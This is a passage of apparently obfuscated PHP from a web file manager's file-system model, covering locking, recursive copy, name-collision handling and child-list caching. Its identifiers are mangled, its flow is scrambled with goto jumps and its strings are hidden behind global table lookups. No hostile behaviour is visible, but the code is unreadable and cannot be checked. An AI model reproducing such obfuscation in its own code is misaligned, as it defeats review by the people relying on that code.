$A«Ş”µÎÑ); $this->_lockEvent($D×õ”ØİµÎ, array($DÃ¶…ÇèÊ£[497], $DÃ¶…ÇèÊ£[493], $DÃ¶…ÇèÊ£[494]), $A«Ş”µÎÑ); $this->_lockCheckEnd($DÃ¶…ÇèÊ£[492], $D×õ”ØİµÎ); goto fÌÙÁ²„À; aä­ŸÌØœÄ: $A«Ş”µÎÑ = 1; $this->_lockKey($DÃ¶…ÇèÊ£[496] . $D×õ”ØİµÎ, $A«Ş”µÎÑ); $this->_lockEvent($D×õ”ØİµÎ, array($DÃ¶…ÇèÊ£[490], $DÃ¶…ÇèÊ£[491]), $A«Ş”µÎÑ); goto cÁ¶Ù¿êÆô; cÙ‰Ö‰õ¤Ü: $DÃ¶…ÇèÊ£ =& $_SERVER[‚Ğ°–—î]; if (!$this->allowLock()) { return; } $this->_lockCheck($DÃ¶…ÇèÊ£[492], $D×õ”ØİµÎ); goto aä­ŸÌØœÄ; fÌÙÁ²„À: } public function lockMoveEnd($c¢ÁÀªñíŒ) { goto fÚ‡šáí‘©; a¥Û¯ã ÆÑ: $this->_lockKey($Aàµ—ë„¨×[496] . $c¢ÁÀªñíŒ, $Dßææ…‹Ş‚); $this->_lockEvent($c¢ÁÀªñíŒ, array($Aàµ—ë„¨×[490], $Aàµ—ë„¨×[491]), $Dßææ…‹Ş‚); $this->_lockParent($c¢ÁÀªñíŒ, array($Aàµ—ë„¨×[490], $Aàµ—ë„¨×[492]), $Dßææ…‹Ş‚); goto C„‘ÖŒ¶¬Ò; C„‘ÖŒ¶¬Ò: $this->_lockEvent($c¢ÁÀªñíŒ, array($Aàµ—ë„¨×[497], $Aàµ—ë„¨×[493], $Aàµ—ë„¨×[494]), $Dßææ…‹Ş‚); goto a›áÓŸ¤î¼; fÚ‡šáí‘©: $Aàµ—ë„¨× =& $_SERVER[‚Ğ°–—î]; if (!$this->allowLock()) { return; } $Dßææ…‹Ş‚ = 0; goto a¥Û¯ã ÆÑ; a›áÓŸ¤î¼: } private function _lockCheck($a¯§¨¿•ôÔ, $cÄÛ–­‰áò) { goto d¬…äôÎ¨„; d¬…äôÎ¨„: $d˜ÛŞööò¿ =& $_SERVER[‚Ğ°–—î]; $E‡à˜²¹âë = $this->sourceInfo($cÄÛ–­‰áò); $bÅ–“È×›ç = $a¯§¨¿•ôÔ . $d˜ÛŞööò¿[91] . $cÄÛ–­‰áò; goto cÊÓÌİ’»ê; F³±œ¶½¾: $Fá‚Ÿè‡Å° = array_reverse($this->parentLevelArray($E‡à˜²¹âë[$d˜ÛŞööò¿[459]])); foreach ($Fá‚Ÿè‡Å° as $bšè‘·àõ) { $bÅ–“È×›ç = $a¯§¨¿•ôÔ . $d˜ÛŞööò¿[499] . $bšè‘·àõ; if (CacheLock::lockGet($d˜ÛŞööò¿[500] . $bÅ–“È×›ç)) { $E‡à˜²¹âë = $this->sourceInfo($bšè‘·àõ); CacheLock::setErrorMsg($d˜ÛŞööò¿[157] . htmlspecialchars($E‡à˜²¹âë[$d˜ÛŞööò¿[28]]) . $d˜ÛŞööò¿[476] . $B§ÃĞóºò²); $this->_lockKey($bÅ–“È×›ç, 1); $this->_lockKey($bÅ–“È×›ç, 0); } } goto Aèˆ”×Œ†; cÊÓÌİ’»ê: $this->_lockTimeStart[$bÅ–“È×›ç] = timeFloat(); if (!is_array($E‡à˜²¹âë)) { return; } $B§ÃĞóºò² = LNG($d˜ÛŞööò¿[498]); goto dÉŠŒ‰°«; dÉŠŒ‰°«: CacheLock::setErrorMsg($d˜ÛŞööò¿[157] . htmlspecialchars($E‡à˜²¹âë[$d˜ÛŞööò¿[28]]) . $d˜ÛŞööò¿[476] . $B§ÃĞóºò²); $this->_lockKey($bÅ–“È×›ç, 1); $this->_lockKey($bÅ–“È×›ç, 0); goto F³±œ¶½¾; Aèˆ”×Œ†: } private function _lockCheckEnd($bË¤»ƒƒÅ©, $c†Ëæ¾©«„) { goto d‚Øè…©áó; d‚Øè…©áó: $B”…¼ùĞèò =& $_SERVER[‚Ğ°–—î]; $b¸ˆ¢ÈŒ“ = $bË¤»ƒƒÅ© . $B”…¼ùĞèò[91] . $c†Ëæ¾©«„; CacheLock::setErrorMsg($B”…¼ùĞèò[361]); goto Cêºóâù§ô; A±Ñ­£ôå: if ($a‰‹Èë•ƒ > 0.5) { unset(self::$cacheSourceInfo[$B”…¼ùĞèò[410] . $c†Ëæ¾©«„]); } $AãÑò…‰øõ = $this->sourceInfo($c†Ëæ¾©«„); if (!$AãÑò…‰øõ) { show_json(LNG($B”…¼ùĞèò[101]), !1); } goto Dìó‘•”Ä; Cêºóâù§ô: if (!isset($this->_lockTimeStart[$b¸ˆ¢ÈŒ“])) { return; } $a‰‹Èë•ƒ = timeFloat() - $this->_lockTimeStart[$b¸ˆ¢ÈŒ“]; unset($this->_lockTimeStart[$b¸ˆ¢ÈŒ“]); goto A±Ñ­£ôå; Dìó‘•”Ä: } private function _lockParent($F´È¹Å¯õ, $cœÚ¤ÁŠË, $cÍ·™°¯) { if (!$this->autoLockSet) { return; } $Fğå™ÄŠ…¯ = $this->sourceInfo($F´È¹Å¯õ); if (!is_array($Fğå™ÄŠ…¯)) { return; } $b–ì¿İëó = array_reverse($this->parentLevelArray($Fğå™ÄŠ…¯[$_SERVER[‚Ğ°–—î][459]])); foreach ($b–ì¿İëó as $f”íİªÂ‹®) { $this->_lockEvent($f”íİªÂ‹®, $cœÚ¤ÁŠË, $cÍ·™°¯); } } private function _lockEvent($d¦¼µäëéÈ, $e–µ…Ïã‚˜, $d¯à˜ÖÏÌ™) { $BôšáæÇÔ® =& $_SERVER[‚Ğ°–—î]; if (!$this->autoLockSet) { return; } foreach ($e–µ…Ïã‚˜ as $Dò‡è¢‘·â) { $DËÑ‘ëì×’ = $Dò‡è¢‘·â . $BôšáæÇÔ®[91] . $d¦¼µäëéÈ; if ($d¯à˜ÖÏÌ™ && CacheLock::lockGet($BôšáæÇÔ®[500] . $DËÑ‘ëì×’)) { continue; } $this->_lockKey($DËÑ‘ëì×’, $d¯à˜ÖÏÌ™); } } public $_lockTimeStart = array(); public $_lockTime = 5; private static $_lockItemArr = array(); private function _lockKey($B©Š¢‡«˜˜, $AÇËÀ†“œœ = 1) { $bùÜê”‡Ä = $_SERVER[‚Ğ°–—î][500] . md5($B©Š¢‡«˜˜); if ($AÇËÀ†“œœ) { if (isset(self::$_lockItemArr[$bùÜê”‡Ä])) { return; } self::$_lockItemArr[$bùÜê”‡Ä] = 1; CacheLock::lock($bùÜê”‡Ä, $this->_lockTime); } else { if (!isset(self::$_lockItemArr[$bùÜê”‡Ä])) { return; } unset(self::$_lockItemArr[$bùÜê”‡Ä]); CacheLock::unlock($bùÜê”‡Ä); } } public function isParentOf($Dí ‡òÙ†ê, $bç‰´ ËÜÀ) { goto aËÈ±’Å‚´; aËÈ±’Å‚´: $CœˆÏíË¨ =& $_SERVER[‚Ğ°–—î]; $Dß‰ñœŒµ¥ = $this->sourceInfo($Dí ‡òÙ†ê); $D¶ôáì§ì = $this->sourceInfo($bç‰´ ËÜÀ); goto dÏ»İ‡ç“­; dÏ»İ‡ç“­: $f½‘ŒäÛÏ¦ = $Dß‰ñœŒµ¥[$CœˆÏíË¨[459]] . $Dß‰ñœŒµ¥[$CœˆÏíË¨[369]] . $CœˆÏíË¨[47]; $A…¬æĞ‘‚ê = $D¶ôáì§ì[$CœˆÏíË¨[459]] . $D¶ôáì§ì[$CœˆÏíË¨[369]] . $CœˆÏíË¨[47]; $cùÅø­Û‘ = strpos($A…¬æĞ‘‚ê, $f½‘ŒäÛÏ¦) === 0; goto E¤…Ï­±Œ; E¤…Ï­±Œ: return $cùÅø­Û‘; goto c™êƒ§À‡¿; c™êƒ§À‡¿: } private $targetIsDelete = 0; public function copy($F¶à–³‰ñİ, $còÒÉ¦ê“Õ, $cƒ­ó½Ç°® = REPEAT_REPLACE, $cğÆ² æ«é = '') { goto B èƒ­ŞÏ; aŸ‡ÃØáä’: $this->updateModifyTime($còÒÉ¦ê“Õ); return $A¿‘Ìêù¨Ä; goto BÎ°ï–¿Â…; bÙŠ…äï: if (!$AÓğêî‡ã || !$C‰Ö­Âªé || $C‰Ö­Âªé[$F‘ÇöÅ´ò[370]] != $F‘ÇöÅ´ò[83]) { return !1; } if ($this->isParentOf($F¶à–³‰ñİ, $còÒÉ¦ê“Õ)) { return !1; } $C¢°‚®ùÌ = $cğÆ² æ«é ? $cğÆ² æ«é : $AÓğêî‡ã[$F‘ÇöÅ´ò[28]]; goto B“çÕè÷®; B“çÕè÷®: $this->lockCopyStart($F¶à–³‰ñİ); $this->lockWriteStart($còÒÉ¦ê“Õ, $C¢°‚®ùÌ); $C…„ğå¯Á = array($F‘ÇöÅ´ò[501] => array(), $F‘ÇöÅ´ò[502] => array(), $F‘ÇöÅ´ò[503] => array()); goto C¿ÂÍØÄ¿; b™»ÑˆÌâ: if ($AÓğêî‡ã[$F‘ÇöÅ´ò[370]] == $F‘ÇöÅ´ò[83] && $bééÒİ¯”‚ == $A¿‘Ìêù¨Ä) { $this->folderSizeResetChildren($bééÒİ¯”‚); } Model($F‘ÇöÅ´ò[504])->addAll($C…„ğå¯Á[$F‘ÇöÅ´ò[502]], array(), !0); if ($bééÒİ¯”‚ != $A¿‘Ìêù¨Ä || $AÓğêî‡ã[$F‘ÇöÅ´ò[370]] == $F‘ÇöÅ´ò[83]) { Model($F‘ÇöÅ´ò[505])->eventCopy($A¿‘Ìêù¨Ä); } goto cÄ…ÊÖÚØ‘; cÄ…ÊÖÚØ‘: $this->saveAll($C…„ğå¯Á[$F‘ÇöÅ´ò[503]]); Model($F‘ÇöÅ´ò[167])->linkAdd($C…„ğå¯Á[$F‘ÇöÅ´ò[501]]); $this->folderSizeReset($còÒÉ¦ê“Õ); goto aŸ‡ÃØáä’; B èƒ­ŞÏ: $F‘ÇöÅ´ò =& $_SERVER[‚Ğ°–—î]; $AÓğêî‡ã = $this->sourceInfo($F¶à–³‰ñİ); $C‰Ö­Âªé = $this->sourceInfo($còÒÉ¦ê“Õ); goto bÙŠ…äï; C¿ÂÍØÄ¿: $this->targetIsDelete = intval($AÓğêî‡ã[$F‘ÇöÅ´ò[397]]); $bééÒİ¯”‚ = $this->fileNameExistCache($còÒÉ¦ê“Õ, $AÓğêî‡ã[$F‘ÇöÅ´ò[28]]); $A¿‘Ìêù¨Ä = $this->_copy($F¶à–³‰ñİ, $còÒÉ¦ê“Õ, $cƒ­ó½Ç°®, $C…„ğå¯Á, !0, $cğÆ² æ«é); goto dåğˆÄÓ´; dåğˆÄÓ´: $this->_childrenListClear(); $this->lockCopyEnd($F¶à–³‰ñİ); $this->lockWriteEnd($còÒÉ¦ê“Õ, $C¢°‚®ùÌ); goto b™»ÑˆÌâ; BÎ°ï–¿Â…: } private function _copy($FÆÍÁñÊ», $C®ìªÜŒ, $f˜ŒÕæÄ©‰, &$d‡†Ï¿ê¸Ş, $dãÌÆ‡ÀÛ, $A°ø¿ ¿ = '') { goto EùƒÏ÷Í…´; EùƒÏ÷Í…´: $còÃœ’ÍÀÁ =& $_SERVER[‚Ğ°–—î]; $EàÍ––¿– = $this->sourceInfoCache($FÆÍÁñÊ»); $a¥¦ÊÄÓµ‡ = $EàÍ––¿–[$còÃœ’ÍÀÁ[370]] == $còÃœ’ÍÀÁ[83]; goto DğÀƒùø°”; DğÀƒùø°”: $e˜¿©Áó‘¼ = $A°ø¿ ¿ ? $A°ø¿ ¿ : $EàÍ––¿–[$còÃœ’ÍÀÁ[28]]; $Cõ…î™ˆ´ = $this->fileNameExistCache($C®ìªÜŒ, $e˜¿©Áó‘¼); if ($dãÌÆ‡ÀÛ) { $this->_childrenAllMake($FÆÍÁñÊ»); if ($a¥¦ÊÄÓµ‡ && $Cõ…î™ˆ´) { $this->_childrenAllMake($Cõ…î™ˆ´); } } goto d¿éÏÍ; d»ØÖ…¾ùÆ: return $A‹—ÄŠó™ë; goto bŠ‘®ğ¶ÀÇ; d¿éÏÍ: if (!$Cõ…î™ˆ´) { return $this->_copyCreate($FÆÍÁñÊ», $C®ìªÜŒ, $e˜¿©Áó‘¼, $d‡†Ï¿ê¸Ş); } $A‹—ÄŠó™ë = $Cõ…î™ˆ´; if ($a¥¦ÊÄÓµ‡) { if ($f˜ŒÕæÄ©‰ == REPEAT_RENAME_FOLDER) { $e˜¿©Áó‘¼ = $this->fileNameAutoCache($C®ìªÜŒ, $e˜¿©Áó‘¼, $f˜ŒÕæÄ©‰, $a¥¦ÊÄÓµ‡); $A‹—ÄŠó™ë = $this->_copyCreate($FÆÍÁñÊ», $C®ìªÜŒ, $e˜¿©Áó‘¼, $d‡†Ï¿ê¸Ş); } else { $cšô™„•× = $this->_childrenList($FÆÍÁñÊ»); foreach ($cšô™„•× as $B¤­åÔÂçç) { $this->_copy($B¤­åÔÂçç[$còÃœ’ÍÀÁ[369]], $Cõ…î™ˆ´, $f˜ŒÕæÄ©‰, $d‡†Ï¿ê¸Ş, !1); } } } else { if ($f˜ŒÕæÄ©‰ == REPEAT_RENAME || $f˜ŒÕæÄ©‰ == REPEAT_RENAME_FOLDER) { $e˜¿©Áó‘¼ = $this->fileNameAutoCache($C®ìªÜŒ, $e˜¿©Áó‘¼, $f˜ŒÕæÄ©‰, $a¥¦ÊÄÓµ‡); $A‹—ÄŠó™ë = $this->_copyCreate($FÆÍÁñÊ», $C®ìªÜŒ, $e˜¿©Áó‘¼, $d‡†Ï¿ê¸Ş); } else { if ($f˜ŒÕæÄ©‰ == REPEAT_REPLACE) { $aÄ×Šµß¥† = $this->sourceInfoCache($Cõ…î™ˆ´); $fœĞÜŠ·î¦ = $this->fileHistory($aÄ×Šµß¥†, $EàÍ––¿–[$còÃœ’ÍÀÁ[419]], $EàÍ––¿–[$còÃœ’ÍÀÁ[77]]); if ($fœĞÜŠ·î¦) { $d‡†Ï¿ê¸Ş[$còÃœ’ÍÀÁ[501]][] = $EàÍ––¿–[$còÃœ’ÍÀÁ[419]]; } } else { if ($f˜ŒÕæÄ©‰ == REPEAT_SKIP) { } } } Hook::trigger($còÃœ’ÍÀÁ[506], array($còÃœ’ÍÀÁ[507], $EàÍ––¿–, 0)); } goto d»ØÖ…¾ùÆ; bŠ‘®ğ¶ÀÇ: } private function _copyCreate($d¸´ŞÅö±Í, $Eõ¯¶—´èš, $Aöò±îˆ‡, &$a÷¼ºİÚÙ) { goto DšíÈä²‚ì; DšíÈä²‚ì: $Aã‰°‹††‰ =& $_SERVER[‚Ğ°–—î]; $e§ÅŠå‰Å = $this->sourceInfoCache($d¸´ŞÅö±Í); $E–Ñ§åÏ‚’ = $this->sourceInfoCache($Eõ¯¶—´èš); goto Bä°½ÊçÒÖ; EŸ‘ºŞùÈÛ: foreach ($dùÁ×—¾ as $aë–äÏé©‚) { $dÆÖ‰·Ìø = $aë–äÏé©‚[$Aã‰°‹††‰[369]]; $e˜ÁÅ°ƒ©› = $this->_childrenMatch($eçä·íô, $aë–äÏé©‚, $BõÁŠ¾ìÁâ); $c§¥‚°ŠŞÎ[] = array($Aã‰°‹††‰[369], $dÆÖ‰·Ìø, $Aã‰°‹††‰[461], $e˜ÁÅ°ƒ©›[$Aã‰°‹††‰[461]]); $dó—Óæ°Î[] = array($Aã‰°‹††‰[369], $dÆÖ‰·Ìø, $Aã‰°‹††‰[459], $e˜ÁÅ°ƒ©›[$Aã‰°‹††‰[459]]); $this->_copyApplyMeta($aë–äÏé©‚, $a÷¼ºİÚÙ); if ($aë–äÏé©‚[$Aã‰°‹††‰[370]] != $Aã‰°‹††‰[83]) { $a÷¼ºİÚÙ[$Aã‰°‹††‰[501]][] = $aë–äÏé©‚[$Aã‰°‹††‰[419]]; } } $this->chunkEventSet($Aã‰°‹††‰[513], array($Aã‰°‹††‰[514], $CÕÕ¦ööõÇ, $D–ÂÓç“‚Æ)); $this->saveAll($c§¥‚°ŠŞÎ); goto aŠ…Õ‘ß¬Ñ; bÄ÷ ”˜´: $this->_childrenListAll($d¸´ŞÅö±Í, $AÕí·ù›·); $D–ÂÓç“‚Æ = count($AÕí·ù›·); if ($D–ÂÓç“‚Æ == 0) { return $a°Òš‚¨•¢; } goto cÉÔ‚Ïòõ¸; cÉÔ‚Ïòõ¸: $BõÁŠ¾ìÁâ = $this->sourceInfo($a°Òš‚¨•¢); foreach ($AÕí·ù›· as $aë–äÏé©‚) { $eè¬›ÀÕ²® = $this->_makeItemData($aë–äÏé©‚, $BõÁŠ¾ìÁâ, $aë–äÏé©‚[$Aã‰°‹††‰[28]]); $eè¬›ÀÕ²®[$Aã‰°‹††‰[459]] = $aë–äÏé©‚[$Aã‰°‹††‰[459]]; $Cñª¢Æµˆ[] = $eè¬›ÀÕ²®; } $this->chunkEventSet($Aã‰°‹††‰[511], array($Aã‰°‹††‰[512], $CÕÕ¦ööõÇ, $D–ÂÓç“‚Æ)); goto CŠî§ÃÜƒ‘; Bä°½ÊçÒÖ: $CÕÕ¦ööõÇ = $this->_makeItemData($e§ÅŠå‰Å, $E–Ñ§åÏ‚’, $Aöò±îˆ‡); Hook::trigger($Aã‰°‹††‰[508], $CÕÕ¦ööõÇ); Hook::trigger($Aã‰°‹††‰[509], array($Aã‰°‹††‰[510], $CÕÕ¦ööõÇ, 0)); goto eã—˜ÊŒ”ì; e—è‰›Ã¯ˆ: if ($e§ÅŠå‰Å[$Aã‰°‹††‰[370]] != $Aã‰°‹††‰[83]) { $a÷¼ºİÚÙ[$Aã‰°‹††‰[501]][] = $e§ÅŠå‰Å[$Aã‰°‹††‰[419]]; return $a°Òš‚¨•¢; } $AÕí·ù›· = array(); $Cñª¢Æµˆ = array(); goto bÄ÷ ”˜´; eã—˜ÊŒ”ì: $a°Òš‚¨•¢ = $this->add($CÕÕ¦ööõÇ); $D¯Ôøá…ˆ = array($Aã‰°‹††‰[369] => $a°Òš‚¨•¢, $Aã‰°‹††‰[28] => $Aöò±îˆ‡); $this->_copyApplyMeta($D¯Ôøá…ˆ, $a÷¼ºİÚÙ); goto e—è‰›Ã¯ˆ; cÒÈé¨„·: $eçä·íô[$d¸´ŞÅö±Í] = $a°Òš‚¨•¢; $c§¥‚°ŠŞÎ = array(); $dó—Óæ°Î = array(); goto EŸ‘ºŞùÈÛ; CŠî§ÃÜƒ‘: $this->addAll($Cñª¢Æµˆ, array(), !1); $dùÁ×—¾ = $this->where(array($Aã‰°‹††‰[461] => $a°Òš‚¨•¢))->select(); $eçä·íô = $this->_childrenMakeRelation($AÕí·ù›·, $dùÁ×—¾); goto cÒÈé¨„·; aŠ…Õ‘ß¬Ñ: $this->chunkEventSet($Aã‰°‹††‰[515], array($Aã‰°‹††‰[516], $CÕÕ¦ööõÇ, $D–ÂÓç“‚Æ)); $this->saveAll($dó—Óæ°Î); return $a°Òš‚¨•¢; goto a‹âïø“Ô¦; a‹âïø“Ô¦: } private function _childrenMakeRelation($e–ñôÛ»ñ’, $f­Ü¿¬¶) { $C³ö¿Çºé =& $_SERVER[‚Ğ°–—î]; $Cå¸Ø‚ÜöÁ = array(); $eñ‹— ä‰ = array(); foreach ($e–ñôÛ»ñ’ as $Aƒ¦Í©Øç‹) { $Fì•á…¡µÛ = $Aƒ¦Í©Øç‹[$C³ö¿Çºé[28]] . $C³ö¿Çºé[8] . $Aƒ¦Í©Øç‹[$C³ö¿Çºé[459]]; $Cå¸Ø‚ÜöÁ[$Fì•á…¡µÛ] = $Aƒ¦Í©Øç‹[$C³ö¿Çºé[369]]; } foreach ($f­Ü¿¬¶ as $Aƒ¦Í©Øç‹) { $Fì•á…¡µÛ = $Aƒ¦Í©Øç‹[$C³ö¿Çºé[28]] . $C³ö¿Çºé[8] . $Aƒ¦Í©Øç‹[$C³ö¿Çºé[459]]; $DŸ‚‡ö’Ú¬ = $Cå¸Ø‚ÜöÁ[$Fì•á…¡µÛ]; $eñ‹— ä‰[$DŸ‚‡ö’Ú¬] = $Aƒ¦Í©Øç‹[$C³ö¿Çºé[369]]; } return $eñ‹— ä‰; } private function _childrenMatch($AŒ£Ïö‡à÷, $DŒ¡®Ã†Šª, $D¿ˆŒƒ´ğì) { goto C…÷¯“õ¾Æ; c Ñ‘ùÉòÁ: foreach ($C¼„ä„İ²í as $aó›ĞÓÙÔ) { if (isset($AŒ£Ïö‡à÷[$aó›ĞÓÙÔ])) { $EÀŞÁºóÖ .= $AŒ£Ïö‡à÷[$aó›ĞÓÙÔ] . $AÍÊŠĞæ×Š[517]; } } $EÀŞÁºóÖ = rtrim($EÀŞÁºóÖ, $AÍÊŠĞæ×Š[47]) . $AÍÊŠĞæ×Š[47]; $E¼”ôõ‡¢ = $this->parentLevelArray($EÀŞÁºóÖ); goto E´Öµ­Ÿ‚‡; C…÷¯“õ¾Æ: $AÍÊŠĞæ×Š =& $_SERVER[‚Ğ°–—î]; $EÀŞÁºóÖ = $D¿ˆŒƒ´ğì[$AÍÊŠĞæ×Š[459]]; $C¼„ä„İ²í = $this->parentLevelArray($DŒ¡®Ã†Šª[$AÍÊŠĞæ×Š[459]]); goto c Ñ‘ùÉòÁ; E´Öµ­Ÿ‚‡: $D†ˆ¡Á±×ì = $E¼”ôõ‡¢[count($E¼”ôõ‡¢) - 1]; return array($AÍÊŠĞæ×Š[461] => $D†ˆ¡Á±×ì, $AÍÊŠĞæ×Š[459] => $EÀŞÁºóÖ); goto Fø¤ŸŠÙ½ô; Fø¤ŸŠÙ½ô: } private function _makeItemData($FÍ­å¾ÊŒ«, $Fƒ®‡°äç, $cîÕ§î¯Ü©) { $aíÄŠ¬Ï³Ğ =& $_SERVER[‚Ğ°–—î]; $D¶ºâ•ë‡ = array($aíÄŠ¬Ï³Ğ[518] => $FÍ­å¾ÊŒ«[$aíÄŠ¬Ï³Ğ[370]], $aíÄŠ¬Ï³Ğ[386] => $cîÕ§î¯Ü©, $aíÄŠ¬Ï³Ğ[519] => $FÍ­å¾ÊŒ«[$aíÄŠ¬Ï³Ğ[372]], $aíÄŠ¬Ï³Ğ[420] => $FÍ­å¾ÊŒ«[$aíÄŠ¬Ï³Ğ[419]], $aíÄŠ¬Ï³Ğ[520] => $FÍ­å¾ÊŒ«[$aíÄŠ¬Ï³Ğ[77]], $aíÄŠ¬Ï³Ğ[521] => $Fƒ®‡°äç[$aíÄŠ¬Ï³Ğ[371]], $aíÄŠ¬Ï³Ğ[522] => $Fƒ®‡°äç[$aíÄŠ¬Ï³Ğ[456]], $aíÄŠ¬Ï³Ğ[523] => USER_ID, $aíÄŠ¬Ï³Ğ[524] => USER_ID, $aíÄŠ¬Ï³Ğ[368] => $Fƒ®‡°äç[$aíÄŠ¬Ï³Ğ[369]], $aíÄŠ¬Ï³Ğ[525] => $Fƒ®‡°äç[$aíÄŠ¬Ï³Ğ[459]] . $Fƒ®‡°äç[$aíÄŠ¬Ï³Ğ[369]] . $aíÄŠ¬Ï³Ğ[47], $aíÄŠ¬Ï³Ğ[396] => 0, $aíÄŠ¬Ï³Ğ[526] => $aíÄŠ¬Ï³Ğ[33]); return $D¶ºâ•ë‡; } private function _copyApplyMeta($A°ï×éè¤¼, &$bêÊ‘Œ„†) { $e™œËğğƒ =& $_SERVER[‚Ğ°–—î]; $fß¶îÆĞÚ = $A°ï×éè¤¼[$e™œËğğƒ[369]]; $b¨È–ô«±í = $A°ï×éè¤¼[$e™œËğğƒ[28]]; if (!isset($A°ï×éè¤¼[$e™œËğğƒ[527]]) || !$A°ï×éè¤¼[$e™œËğğƒ[527]] || $A°ï×éè¤¼[$e™œËğğƒ[527]] == $e™œËğğƒ[468]) { $bêÊ‘Œ„†[$e™œËğğƒ[503]][] = array($e™œËğğƒ[369], $fß¶îÆĞÚ, $e™œËğğƒ[527], short_id($fß¶îÆĞÚ)); } if (Input::check($b¨È–ô«±í, $e™œËğğƒ[528])) { $bêÊ‘Œ„†[$e™œËğğƒ[502]][] = array($e™œËğğƒ[369] => $fß¶îÆĞÚ, $e™œËğğƒ[89] => $e™œËğğƒ[416], $e™œËğğƒ[359] => str_replace($e™œËğğƒ[50], $e™œËğğƒ[33], Pinyin::encode($b¨È–ô«±í))); $bêÊ‘Œ„†[$e™œËğğƒ[502]][] = array($e™œËğğƒ[369] => $fß¶îÆĞÚ, $e™œËğğƒ[89] => $e™œËğğƒ[415], $e™œËğğƒ[359] => Pinyin::encode($b¨È–ô«±í, $e™œËğğƒ[529])); } } private $_childrenListCache = array(); private $_childrenItemCache = array(); private function _childrenAllMake($cÏçÜÂ³¯‰) { goto B£ŞÛÙçÈŒ; E­±øÔ¹ì: $e…àö’ĞÉ¹ = array($f£ÃÀ˜Äòî[459] => array($f£ÃÀ˜Äòî[483], $B²Ğ‹£ô´°[$f£ÃÀ˜Äòî[459]] . $cÏçÜÂ³¯‰ . $f£ÃÀ˜Äòî[484]), $f£ÃÀ˜Äòî[397] => $this->targetIsDelete); $A“×Úê¤Å = $this->field($bÙá‹æŠ©ò)->where($e…àö’ĞÉ¹)->select(); if (!$A“×Úê¤Å) { return; } goto fæøØ©­²„; fæøØ©­²„: $A“×Úê¤Å = array_to_keyvalue($A“×Úê¤Å, $f£ÃÀ˜Äòî[369]); foreach ($A“×Úê¤Å as $EÉÀ£™¯) { $f¶èë¬Ó•ò = $EÉÀ£™¯[$f£ÃÀ˜Äòî[461]]; $cÏçÜÂ³¯‰ = $EÉÀ£™¯[$f£ÃÀ˜Äòî[369]]; if (!isset($this->_childrenListCache[$cÏçÜÂ³¯‰]) && $EÉÀ£™¯[$f£ÃÀ˜Äòî[370]] == $f£ÃÀ˜Äòî[83]) { $this->_childrenListCache[$cÏçÜÂ³¯‰] = array(); } if (!isset($this->_childrenListCache[$f¶èë¬Ó•ò])) { $this->_childrenListCache[$f¶èë¬Ó•ò] = array(); } $this->_childrenListCache[$f¶èë¬Ó•ò][$cÏçÜÂ³¯‰] = $EÉÀ£™¯; $this->_childrenItemCache[$cÏçÜÂ³¯‰] = $EÉÀ£™¯; } goto có êğ²±†; B£ŞÛÙçÈŒ: $f£ÃÀ˜Äòî =& $_SERVER[‚Ğ°–—î]; $B²Ğ‹£ô´° = $this->sourceInfo($cÏçÜÂ³¯‰); $bÙá‹æŠ©ò = $f£ÃÀ˜Äòî[530]; goto E­±øÔ¹ì; có êğ²±†: } private function _childrenListAll($e—ÙÜë‘„ß, &$Aòâ‚Ñã˜¥) { $d…È›†¯èº =& $_SERVER[‚Ğ°–—î]; if (!isset($this->_childrenListCache[$e—ÙÜë‘„ß])) { return; } $a‹¬Ö¥ƒ = $this->_childrenListCache[$e—ÙÜë‘„ß]; foreach ($a‹¬Ö¥ƒ as $EÖç‹×Û¯² => $CÕ…ç¿Õ) { $Aòâ‚Ñã˜¥[$EÖç‹×Û¯²] = $CÕ…ç¿Õ; if ($CÕ…ç¿Õ[$d…È›†¯èº[370]] == $d…È›†¯èº[83]) { $this->_childrenListAll($EÖç‹×Û¯², $Aòâ‚Ñã˜¥); } } } private function sourceInfoCache($eğÃï­«”) { if (isset($this->_childrenItemCache[$eğÃï­«”])) { return $this->_childrenItemCache[$eğÃï­«”]; } return $this->sourceInfo($eğÃï­«”); } private function _childrenList($eê¢¶ğªªµ) { if (isset($this->_childrenListCache[$eê¢¶ğªªµ])) { return $this->_childrenListCache[$eê¢¶ğªªµ]; } return $this->_childrenListSelect($eê¢¶ğªªµ); } private function _childrenListSelect($b“Ñ‹²¼†ù) { goto a™¹¸óË™Ù; cğ´Ä’¦Ÿß: foreach ($BæŒÓÎ¡ãÎ as $b“Ñ‹²¼†ù => $DöÓ«ñÈÉ) { $this->_childrenItemCache[$b“Ñ‹²¼†ù] = $DöÓ«ñÈÉ; } return $BæŒÓÎ¡ãÎ; goto a¿Õ‰¦”­Í; a™¹¸óË™Ù: $a™©ªåîáÌ =& $_SERVER[‚Ğ°–—î]; $DŒÒÕó…» = array($a™©ªåîáÌ[461] => $b“Ñ‹²¼†ù, $a™©ªåîáÌ[397] => $this->targetIsDelete); $dÓˆ‹¤áå = $this->where($DŒÒÕó…»)->select(); goto BíÔ¾™¤Èè; BíÔ¾™¤Èè: $dÓˆ‹¤áå = $dÓˆ‹¤áå ? $dÓˆ‹¤áå : array(); $BæŒÓÎ¡ãÎ = array_to_keyvalue($dÓˆ‹¤áå, $a™©ªåîáÌ[369]); $this->_childrenListCache[$b“Ñ‹²¼†ù] = $BæŒÓÎ¡ãÎ; goto cğ´Ä’¦Ÿß; a¿Õ‰¦”­Í: } private function fileNameExistCache($EÊàÒ¼§÷†, $fÓšš‚îØÛ) { $eÂÉğ ¯•’ =& $_SERVER[‚Ğ°–—î]; $fÓšš‚îØÛ = strtolower($fÓšš‚îØÛ); $ağõİ¬ñ³ = $this->_childrenList($EÊàÒ¼§÷†); foreach ($ağõİ¬ñ³ as $Eˆš¹Ó“æ) { if ($fÓšš‚îØÛ == strtolower($Eˆš¹Ó“æ[$eÂÉğ ¯•’[28]])) { return $Eˆš¹Ó“æ[$eÂÉğ ¯•’[369]]; } } return !1; } private function fileNameAutoCache($AëÁ¤…ó£ê, $CØ·±ÕöŒ¤, $B¸§‰Í£ƒ«, $Aßˆ‚—ó·Ã) { $eƒóçó‡¨˜ =& $_SERVER[‚Ğ°–—î]; $d¬Ü‹õˆŞ— = $this->_childrenList($AëÁ¤…ó£ê); $f©Ù‡¿ˆõò = array_to_keyvalue($d¬Ü‹õˆŞ—, $eƒóçó‡¨˜[33], $eƒóçó‡¨˜[28]); return $this->fileNameAutoGet($f©Ù‡¿ˆõò, $CØ·±ÕöŒ¤, $B¸§‰Í£ƒ«, $Aßˆ‚—ó·Ã); } private function _childrenListClear() { $this->_childrenListCache = null; $this->_childrenItemCache = null; $this->_childrenListCache = array(); $this->_childrenItemCache = array(); } public function move($b’ô¬Ì‹ñÖ, 